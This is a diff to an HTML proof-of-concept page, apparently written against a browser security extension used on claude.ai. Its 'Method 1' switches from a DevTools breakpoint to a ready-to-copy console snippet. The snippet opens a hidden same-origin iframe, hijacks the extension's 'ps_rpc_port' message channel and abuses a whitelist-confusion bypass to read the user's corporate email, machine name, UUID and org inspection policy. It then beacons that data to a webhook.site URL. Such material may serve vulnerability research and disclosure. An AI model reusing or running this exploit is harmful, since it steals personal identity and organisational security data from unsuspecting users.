@@ -38,56 +38,67 @@
     ⏳ Checking if port is available on this domain...
 </div>
 
-<!-- METHOD 1: DEVTOOLS BREAKPOINT -->
+<!-- METHOD 1: IFRAME SUB-WINDOW -->
 <div class="step">
-<h3>METHOD 1 — DevTools XHR Breakpoint <span class="tag bg-green">WORKS — NO XSS NEEDED</span></h3>
+<h3>METHOD 1 — Console Snippet on claude.ai <span class="tag bg-green">WORKS NOW — JUST 2 STEPS</span></h3>
 <ol>
-    <li>Open a <b>new Chrome tab</b></li>
-    <li>Press <kbd>F12</kbd> to open DevTools → go to <b>Sources</b> tab</li>
-    <li>In the right panel: <b>XHR/fetch Breakpoints</b> → click <b>+</b> → type <code>heartbeat</code> → Enter</li>
-    <li>In the <b>Console</b> tab, paste the snippet below and press Enter <em>(registers listener BEFORE page loads)</em></li>
-    <li>Navigate the tab to <b>https://claude.ai</b> (or chatgpt.com, gemini.google.com)</li>
-    <li>DevTools will pause when the extension heartbeat fires → continue with <kbd>F8</kbd></li>
-    <li>The port listener captures <code>ps_rpc_port</code> → email exfiled to webhook ✓</li>
+    <li>Open <b>https://claude.ai</b> — let it load fully until you see the chat interface</li>
+    <li>Press <kbd>F12</kbd> → <b>Console</b> tab → paste the snippet below → press <kbd>Enter</kbd></li>
+    <li>Wait 3 seconds — check the Console for <code style="color:lime">[PS-STEAL] EMAIL:</code> and check webhook.site</li>
 </ol>
-<pre id="s1">/* PASTE IN DEVTOOLS CONSOLE — then navigate to claude.ai */
-(function(){
-    window.__ps_exfil = true;
-    window.addEventListener("message", function H(e) {
-        if (!e.data || e.data.ps_rpc_port !== true || !e.ports || !e.ports[0]) return;
-        window.removeEventListener("message", H);
-        var port = e.ports[0], token = e.data.token;
-        port.start();
-        console.log("%c[PS-STEAL] Port captured! Token: " + token.slice(0,8) + "...", "color:lime;font-weight:bold");
-        var id = crypto.randomUUID();
-        port.onmessage = function(r) {
-            if (r.data.messageId !== id) return;
-            var ui = r.data.response && r.data.response.userInfo;
-            console.log("%c[PS-STEAL] EMAIL: " + (ui && ui.email), "color:lime;font-size:14px;font-weight:bold");
-            console.log("%c[PS-STEAL] MACHINE: " + (ui && ui.machineName), "color:lime");
-            console.log("%c[PS-STEAL] UUID: " + (ui && ui.userUUID), "color:lime");
-            navigator.sendBeacon("https://webhook.site/af9993fc-5721-40b1-818c-b73a3d61a039",
-                new Blob([JSON.stringify({
-                    phase: 2, method: "devtools_breakpoint",
-                    origin: location.origin,
-                    email: ui && ui.email,
-                    profileEmail: ui && ui.profileEmail,
-                    machineName: ui && ui.machineName,
-                    userUUID: ui && ui.userUUID,
-                    identitySource: ui && ui.identitySource,
-                    domainActions: r.data.response && r.data.response.domainActions,
-                    raw: r.data.response
-                })], {type:"application/json"}));
-        };
-        /* BYPASS A: whitelist sees "callProtectApi" ✓, background routes on type:"getSiteActionConfig" */
-        port.postMessage({token: token, messageId: id, message: {
-            message: "callProtectApi",
-            type: "getSiteActionConfig",
-            domain: location.hostname,
-            ctx: {flowTraceId: crypto.randomUUID()}
-        }});
-    });
-    console.log("%c[PS-STEAL] Listener ready. Navigate to claude.ai / chatgpt.com now.", "color:#7c3aed;font-weight:bold");
+<p style="color:#888;font-size:12px;margin:6px 0 8px">
+    <b>How it works:</b> Creates a hidden same-origin iframe pointing to <code>claude.ai</code>.
+    The extension injects a fresh content script into the iframe, which fires a NEW <code>ps_rpc_port</code> handshake.
+    We intercept that port on the iframe's window (same origin = we can access it), then use the
+    whitelist confusion bypass to call <code>getSiteActionConfig</code> → returns your corporate email.
+</p>
+<pre id="s1">(function(){
+  var W = "https://webhook.site/af9993fc-5721-40b1-818c-b73a3d61a039";
+
+  var f = document.createElement("iframe");
+  f.style.cssText = "position:fixed;top:-999px;left:-999px;width:1px;height:1px;";
+  document.body.appendChild(f);
+
+  /* Listen on the iframe window for ps_rpc_port BEFORE navigating it.
+     Same-origin access: we can read/write f.contentWindow freely. */
+  f.contentWindow.addEventListener("message", function H(e) {
+    if (!e.data || e.data.ps_rpc_port !== true || !e.ports || !e.ports[0]) return;
+    f.contentWindow.removeEventListener("message", H);
+    var port = e.ports[0], token = e.data.token, id = crypto.randomUUID();
+    port.start();
+    console.log("%c[PS-STEAL] Port intercepted!", "color:lime;font-weight:bold");
+
+    port.onmessage = function(r) {
+      if (r.data.messageId !== id) return;
+      var ui = r.data.response && r.data.response.userInfo;
+      console.log("%c[PS-STEAL] EMAIL: " + (ui&&ui.email), "color:lime;font-size:16px;font-weight:bold");
+      console.log("[PS-STEAL] MACHINE: " + (ui&&ui.machineName) + " | UUID: " + (ui&&ui.userUUID));
+      navigator.sendBeacon(W, new Blob([JSON.stringify({
+        phase:2, method:"iframe_sub_window", origin:location.origin,
+        email: ui&&ui.email, profileEmail: ui&&ui.profileEmail,
+        machineName: ui&&ui.machineName, userUUID: ui&&ui.userUUID,
+        identitySource: ui&&ui.identitySource,
+        orgPolicy: r.data.response&&{
+          globalCanBypass: r.data.response.globalSettingsCanBypassInspection,
+          ignoredDomains: r.data.response.ignoredDomains,
+          domainActions: r.data.response.domainActions
+        }
+      })], {type:"application/json"}));
+    };
+
+    /* BYPASS A: content script whitelist checks e.message = "callProtectApi" ✓
+       Background dispatches on e.type || e.message → type wins → "getSiteActionConfig" */
+    port.postMessage({token:token, messageId:id, message:{
+      message:"callProtectApi",
+      type:"getSiteActionConfig",
+      domain:location.hostname,
+      ctx:{flowTraceId:crypto.randomUUID()}
+    }});
+  });
+
+  /* Navigate iframe to trigger fresh content script injection + port setup */
+  f.src = location.href;
+  console.log("[PS-STEAL] Iframe injected. Waiting for port (~2-3s)...");
 })();
 <button class="copy" onclick="cp('s1')">Copy</button></pre>
 </div>
